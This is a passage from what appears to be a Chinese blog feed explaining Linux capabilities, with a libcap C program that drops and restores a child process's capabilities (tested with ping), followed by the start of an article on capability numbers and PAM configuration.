操作；</li><li>设置 &#x2F;proc&#x2F;PID&#x2F;oom_score_adj 为一个小于由一个具有 CAP_SYS_RESOURCE 的进程最近设置的值的值。</li></ul></li><li><p><strong>CAP_SYS_TIME</strong><br>设置系统时钟 (<strong>settimeofday</strong>(2)，<strong>stime</strong>(2)，<strong>adjtimex</strong>(2))；设置实时 (硬件) 时钟。</p></li><li><p><strong>CAP_SYS_TTY_CONFIG</strong><br>使用 <strong>vhangup</strong>(2)；对虚拟终端使用各种特权 <strong>ioctl</strong>(2) 操作。</p></li><li><p>CAP_SYSLOG</p><p>(自 Linux 2.6.37)</p><ul><li>执行特权 <strong>syslog</strong>(2) 操作。参考 <strong>syslog</strong>(2) 来获取哪些操作需要特权的信息；</li><li>当 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;kptr_restrict 值为 1 时，查看通过 &#x2F;proc 和其它接口暴露<br>的内核地址。(参考 <strong>proc</strong>(5) 中 kptr_restrict 的讨论。)</li></ul></li><li><p><strong>CAP_WAKE_ALARM</strong> (自 Linux 3.0)<br>触发将唤醒系统的东西 (设置 CLOCK_REALTIME_ALARM 和 CLOCK_BOOTTIME_ALARM 定时器)</p></li></ul><ol><li>找出所有设置<code>uid</code> 位程序，使用以下命令：</li></ol><pre><code>find / -perm /u=sfind / -perm -4000</code></pre><p>结果如下：</p><p><img src="/%E9%80%89%E5%8C%BA_048.png" alt="选区_048"></p><p><img src="/%E9%80%89%E5%8C%BA_049.png" alt="选区_049"></p><p>部分需要的权能如下：</p><table><thead><tr><th>程序</th><th>需要的权能</th></tr></thead><tbody><tr><td>&#x2F;bin&#x2F;ping</td><td>CAP_NET_RAW</td></tr><tr><td>&#x2F;bin&#x2F;mount</td><td>CAP_SYS_ADMIN</td></tr><tr><td>&#x2F;bin&#x2F;su</td><td>CAP_DAC_OVERRIDE,CAP_SETGID,CAP_SETUID</td></tr><tr><td>&#x2F;bin&#x2F;fusermount</td><td>CAP_SYS_ADMIN</td></tr><tr><td>&#x2F;bin&#x2F;umount</td><td>CAP_SYS_ADMIN</td></tr><tr><td>&#x2F;usr&#x2F;bin&#x2F;passwd</td><td>CAP_CHOWN ,CAP_DAC_OVERRIDE ,CAP_FOWNER</td></tr></tbody></table><ol><li><p>在linux中，文件权能有如下三种：</p><ul><li>effective：当前有效的权能，执行某特权操作时，操作系统检查cap_effective的对应位是否有效,而不再是检查进程的有效UID是否为0。</li><li>permitted：当前进程所有能使用的能力，effective包含于permitted</li><li>inheritable：可以被继承的能力</li></ul><p>linux程序调用子程序，权能变换公式如下：</p><pre class="line-numbers language-python"><code class="language-python">P’<span class="token punctuation">(</span>ambient<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>file <span class="token keyword">is</span> privileged<span class="token punctuation">)</span> ? <span class="token number">0</span> <span class="token punctuation">:</span> P<span class="token punctuation">(</span>ambient<span class="token punctuation">)</span>P'<span class="token punctuation">(</span>permitted<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>P<span class="token punctuation">(</span>inheritable<span class="token punctuation">)</span> <span class="token operator">&amp;</span> F<span class="token punctuation">(</span>inheritable<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>F<span class="token punctuation">(</span>permitted<span class="token punctuation">)</span> <span class="token operator">&amp;</span> cap_bset<span class="token punctuation">)</span><span class="token operator">|</span> P’<span class="token punctuation">(</span>ambient<span class="token punctuation">)</span>P<span class="token string">'(effective) = F(effective) ? P'</span><span class="token punctuation">(</span>permitted<span class="token punctuation">)</span> <span class="token punctuation">:</span> P’<span class="token punctuation">(</span>ambient<span class="token punctuation">)</span>P'<span class="token punctuation">(</span>inheritable<span class="token punctuation">)</span> <span class="token operator">=</span> P<span class="token punctuation">(</span>inheritable<span class="token punctuation">)</span> <span class="token punctuation">[</span>i<span class="token punctuation">.</span>e<span class="token punctuation">.</span><span class="token punctuation">,</span> unchanged<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>其中：</p><ul><li>P denotes the value of a thread capability set before the execve(2)</li><li>P’ denotes the value of a capability set after the execve(2)</li><li>F denotes a file capability set</li><li>cap_bset is the value of the capability bounding set (described below).</li></ul><p>A privileged file is one that has capabilities or has the set-user-ID or set-group-ID bit set.</p></li></ol><p>实现一个程序其满足以下的功能：</p><ul><li>能够永久的删除其子进程的某个权能。</li><li>能暂时性的删除其子进程的某个权能。</li><li>能让上面被暂时性删除的权能重新获得</li></ul><p>以ping为例，我们知道ping需要的权能为cap_net_raw，为了能在execve后执行ping，即execve中的ping有cap_net_raw权能，根据上面的变换规则：</p><ul><li>设置&#x2F;bin&#x2F;ping权能为cap_net_raw+ei，使得可以继承<ul><li>sudo setcap cap_net_raw+ei &#x2F;bin&#x2F;ping</li></ul></li><li>设置当前的进程的权能有cap_net_raw+i权能</li></ul><p>永久删除子进程的权能就移除effective和inheritable、permitted的，暂时性删除就移除effective和inheritable的，恢复暂时性删除的就添加进effective和inheritable。</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/capability.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/prctl.h></span></span><span class="token macro property">#<span class="token directive keyword">undef</span> _POSIX_SOURCE</span><span class="token keyword">extern</span> <span class="token keyword">int</span> errno<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">whoami</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"uid=%i  euid=%i  gid=%i\n"</span><span class="token punctuation">,</span> <span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">geteuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">getgid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">listCaps</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    cap_t caps <span class="token operator">=</span> <span class="token function">cap_get_proc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ssize_t y <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The Process %d was give capabilities %s\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">cap_to_text</span><span class="token punctuation">(</span>caps<span class="token punctuation">,</span> <span class="token operator">&amp;</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">cap_free</span><span class="token punctuation">(</span>caps<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">do_ping</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token function">whoami</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">listCaps</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">execlp</span><span class="token punctuation">(</span><span class="token string">"ping"</span><span class="token punctuation">,</span><span class="token string">"ping"</span><span class="token punctuation">,</span><span class="token string">"-c 1"</span><span class="token punctuation">,</span><span class="token string">"localhost"</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"请使用sudo执行本程序"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>            cap_value_t cap_values<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>CAP_SETUID<span class="token punctuation">,</span> CAP_SETGID<span class="token punctuation">,</span> CAP_SETPCAP <span class="token punctuation">,</span>CAP_NET_RAW<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span>    cap_t caps <span class="token operator">=</span> <span class="token function">cap_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">cap_set_flag</span><span class="token punctuation">(</span>caps<span class="token punctuation">,</span> CAP_PERMITTED<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> cap_values<span class="token punctuation">,</span> CAP_SET<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">cap_set_flag</span><span class="token punctuation">(</span>caps<span class="token punctuation">,</span> CAP_EFFECTIVE<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> cap_values<span class="token punctuation">,</span> CAP_SET<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">cap_set_proc</span><span class="token punctuation">(</span>caps<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">prctl</span><span class="token punctuation">(</span>PR_SET_KEEPCAPS<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">cap_free</span><span class="token punctuation">(</span>caps<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setgid</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        caps <span class="token operator">=</span> <span class="token function">cap_get_proc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">cap_set_flag</span><span class="token punctuation">(</span>caps<span class="token punctuation">,</span> CAP_EFFECTIVE<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> cap_values<span class="token punctuation">,</span> CAP_SET<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">cap_set_flag</span><span class="token punctuation">(</span>caps<span class="token punctuation">,</span> CAP_INHERITABLE<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> cap_values<span class="token punctuation">,</span> CAP_SET<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">cap_set_proc</span><span class="token punctuation">(</span>caps<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">cap_free</span><span class="token punctuation">(</span>caps<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">whoami</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">listCaps</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">printInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\n------权能测试小程序------\n\请输入如下字符:\n\1 : 永久的删除其子进程的某个权能\n\2 : 暂时性的删除其子进程的某个权能\n\3 : 暂时性删除的权能重新获得\n\4 : ping -c 1 localhost\n\5 : 查看当前权能\n\q : 退出\n\---------------------------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> line<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">printInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">char</span> cmd <span class="token operator">=</span> line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>cmd <span class="token operator">==</span> <span class="token string">'1'</span> <span class="token operator">||</span> cmd <span class="token operator">==</span> <span class="token string">'2'</span> <span class="token operator">||</span> cmd <span class="token operator">==</span> <span class="token string">'3'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"输入要操作的权能名，如cap_net_raw\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">fgets</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            line<span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>            cap_value_t temp<span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">cap_from_name</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> <span class="token operator">&amp;</span>temp<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Error capability name\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>            <span class="token keyword">else</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                cap_t caps <span class="token operator">=</span> <span class="token function">cap_get_proc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>cmd <span class="token operator">==</span> <span class="token string">'3'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                    <span class="token function">cap_set_flag</span><span class="token punctuation">(</span>caps<span class="token punctuation">,</span> CAP_EFFECTIVE<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>temp<span class="token punctuation">,</span> CAP_SET<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">cap_set_flag</span><span class="token punctuation">(</span>caps<span class="token punctuation">,</span> CAP_INHERITABLE<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>temp<span class="token punctuation">,</span> CAP_SET<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>                <span class="token keyword">else</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                    <span class="token function">cap_set_flag</span><span class="token punctuation">(</span>caps<span class="token punctuation">,</span> CAP_EFFECTIVE<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>temp<span class="token punctuation">,</span> CAP_CLEAR<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">cap_set_flag</span><span class="token punctuation">(</span>caps<span class="token punctuation">,</span> CAP_INHERITABLE<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>temp<span class="token punctuation">,</span> CAP_CLEAR<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>cmd <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">)</span>                        <span class="token function">cap_set_flag</span><span class="token punctuation">(</span>caps<span class="token punctuation">,</span> CAP_PERMITTED<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>temp<span class="token punctuation">,</span> CAP_CLEAR<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">cap_set_proc</span><span class="token punctuation">(</span>caps<span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"cap_set_proc() ERROR: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">else</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s %s success\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>cmd <span class="token operator">==</span><span class="token string">'3'</span><span class="token operator">?</span> <span class="token string">"recover"</span><span class="token punctuation">:</span><span class="token string">"remove"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">cap_free</span><span class="token punctuation">(</span>caps<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>cmd <span class="token operator">==</span> <span class="token string">'4'</span><span class="token punctuation">)</span>            <span class="token function">do_ping</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>cmd <span class="token operator">==</span> <span class="token string">'5'</span><span class="token punctuation">)</span>            <span class="token function">listCaps</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>cmd <span class="token operator">==</span> <span class="token string">'q'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>       <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//休眠1s</span>        <span class="token function">printInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>程序测试：</p><p>测试环境：</p><p><img src="/%E9%80%89%E5%8C%BA_052.png" alt="选区_052"></p><p>运行程序前：<code>sudo setcap cap_net_raw+eip /bin/ping</code>  保证文件有<code>eip</code> 权能</p><ul><li><p>sudo apt install libcap-dev</p></li><li><p>gcc cap.c -lcap -o cap</p></li><li><p>sudo .&#x2F;cap</p></li></ul><p>一开始可以<code>ping</code> :</p><p><img src="/%E9%80%89%E5%8C%BA_053.png" alt="选区_053"></p><p>暂时性删除权能后无法<code>ping</code> :</p><p><img src="/%E9%80%89%E5%8C%BA_054.png" alt="选区_054"></p><p>恢复后可以<code>ping</code>  :</p><p><img src="/%E9%80%89%E5%8C%BA_055.png" alt="选区_055"></p><p>永久删除后无法<code>ping</code> :</p><p><img src="/%E9%80%89%E5%8C%BA_056.png" alt="选区_056"></p><blockquote><p>参考资料：</p><p><a href="https://www.hrwhisper.me/introduction-to-linux-capability/#comments">Linux setuid与权能介绍</a></p><p><a href="https://www.wolfcstech.com/2017/07/10/linux-capabilities-overview/">Linux 权能综述</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> capability </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux权能与PAM机制</title>
      <link href="/2018/05/01/Linux%E6%9D%83%E8%83%BD%E4%B8%8EPAM%E6%9C%BA%E5%88%B6/"/>
      <url>/2018/05/01/Linux%E6%9D%83%E8%83%BD%E4%B8%8EPAM%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<blockquote><p>实验环境：<code>uname -a</code></p><p>​      <code>Linux ubuntu 4.4.0-121-generic #145-Ubuntu SMP Fri Apr 13 13:47:23 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</code></p></blockquote><hr><h3 id="权能对应的系统调用"><a href="#权能对应的系统调用" class="headerlink" title="权能对应的系统调用"></a>权能对应的系统调用</h3><p>使用 <code>sudo find / -name capability.h </code> 查找到路径 <code>/usr/src/linux-headers-4.4.0-121/include/uapi/linux/capbility.h</code>  ，整理可得下表：</p><span id="more"></span><table><thead><tr><th>权能</th><th>编号(相关系统调用）</th><th>解释</th></tr></thead><tbody><tr><td>CAP_CHOWN</td><td>0(chown)</td><td>对文件的UIDs和GIDs做任意修改</td></tr><tr><td>CAP_DAC_OVERRIDE</td><td>1</td><td>忽略对文件的DAC访问限制</td></tr><tr><td>CAP_DAC_READ_SEARCH</td><td>2</td><td>忽略DAC中对文件和目录的读、搜索权限</td></tr><tr><td>CAP_FOWNER</td><td>3</td><td>忽略进程UID与文件UID的匹配检查</td></tr><tr><td>CAP_FSETID</td><td>4</td><td>文件修改时不清除setuid和setgid位，不匹配时设置setgid位</td></tr><tr><td>CAP_KILL</td><td>5(kill)</td><td>绕过发送信号时的权限检查</td></tr><tr><td>CAP_SETGID</td><td>6(setgid)</td><td>设置或管理进程GID</td></tr><tr><td>CAP_SETUID</td><td>7(setuid)</td><td>管理或设置进程UID</td></tr><tr><td>CAP_SETPCAP</td><td>8(capset)</td><td>允许授予或删除其他进程的任何权能</td></tr><tr><td>CAP_LINUX_IMMUTABLE</td><td>9(chattr)</td><td>允许设置文件的不可修改位(IMMUTABLE)和只添加(APPND-ONLY)属性</td></tr><tr><td>CAP_NET_BIND_SERVICE</td><td>10</td><td>允许绑定到小于1024的端口</td></tr><tr><td>CAP_NET_BROADCAST</td><td>11</td><td>允许socket发送监听组播</td></tr><tr><td>CAP_NET_ADMIN</td><td>12</td><td>允许执行网络管理任务</td></tr><tr><td>CAP_NET_RAW</td><td>13(socket)</td><td>允许使用原始套接字</td></tr><tr><td>CAP_IPC_LOCK</td><td>14(mlock)</td><td>允许锁定共享内存片段</td></tr><tr><td>CAP_IPC_OWNER</td><td>15</td><td>忽略IPC所有权检查</td></tr><tr><td>CAP_SYS_MOUDLE</td><td>16(init_module)</td><td>插入和删除内核模块</td></tr><tr><td>CAP_SYS_RAWIO</td><td>17</td><td>允许对ioperm&#x2F;iopl的访问</td></tr><tr><td>CAP_SYS_CHROOT</td><td>18(chroot)</td><td>允许使用chroot()系统调用</td></tr><tr><td>CAP_SYS_PTRACE</td><td>19(ptrace)</td><td>允许跟踪任何进程</td></tr><tr><td>CAP_SYS_PACCT</td><td>20(acct)</td><td>允许配置进程记账</td></tr><tr><td>CAP_SYS_ADMIN</td><td>21</td><td>允许执行系统管理任务</td></tr><tr><td>CAP_SYS_BOOT</td><td>22(reboot)</td><td>允许重新启动系统</td></tr><tr><td>CAP_SYS_NICE</td><td>23(nice)</td><td>允许提升优先级，设置其他进程优先级</td></tr><tr><td>CAP_SYS_RESOURCE</td><td>24(setrlimit)</td><td>设置资源限制</td></tr><tr><td>CAP_SYS_TIME</td><td>25(stime)</td><td>允许改变系统时钟</td></tr><tr><td>CAP_SYS_TTY_CONFIG</td><td>26(vhangup)</td><td>允许配置TTY设备</td></tr><tr><td>CAP_MKNOD</td><td>27(mknod)</td><td>允许使用mknod()系统调用，创建特殊文件</td></tr><tr><td>CAP_LEASE</td><td>28(fcntl)</td><td>为任意文件建立租约</td></tr><tr><td>CAP_AUDIT_WRITE</td><td>29</td><td>允许向内核审计日志写记录</td></tr><tr><td>CAP_AUDIT_CONTROL</td><td>30</td><td>启用或禁用内核审计，修改审计过滤器规则</td></tr><tr><td>CAP_SETFCAP</td><td>31</td><td>设置文件权能</td></tr><tr><td>CAP_MAC_OVERRIDE</td><td>32</td><td>允许MAC配置或状态改变，为smack LSM实现</td></tr><tr><td>CAP_MAC_ADMIN</td><td>33</td><td>覆盖强制访问控制</td></tr><tr><td>CAP_SYSLOG</td><td>34(syslog)</td><td>执行特权syslog(2)操作</td></tr><tr><td>CAP_WAKE_ALARM</td><td>35</td><td>触发将唤醒系统的东西</td></tr><tr><td>CAP_BLOCK_SUSPEND</td><td>36(epoll)</td><td>可以阻塞系统挂起的特性</td></tr><tr><td>CAP_AUDIT_READ</td><td>37</td><td>允许通过一个多播socket读取审计日志</td></tr></tbody></table><p>详情见<a href="http://man7.org/linux/man-pages/man7/capabilities.7.html">man capabilities</a> 。</p><hr><h3 id="基于PAM用户权限设置系统"><a href="#基于PAM用户权限设置系统" class="headerlink" title="基于PAM用户权限设置系统"></a>基于PAM用户权限设置系统</h3><p>PAM 的全称为“可插拔认证模块（Pluggable Authentication Modules）”。设计的初衷是将不同的底层认证机制集中到一个高层次的API中，从而省去开发人员自己去设计和实现各种繁杂的认证机制的麻烦。</p><p>PAM认证一般遵循这样的顺序：Service(服务)→PAM(配置文件)→pam_*.so，PAM配置文件在<code>/etc/pam.d/</code> 目录下，原理图如下：</p><p><img src="/pam.png" alt="pam"></p><p>PAM中配置字段：</p><pre class="line-numbers language-text"><code class="language-text">moudle_type  control_flag  moudle_path moudle_option/moudle_args<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li><code>module_type</code> 为 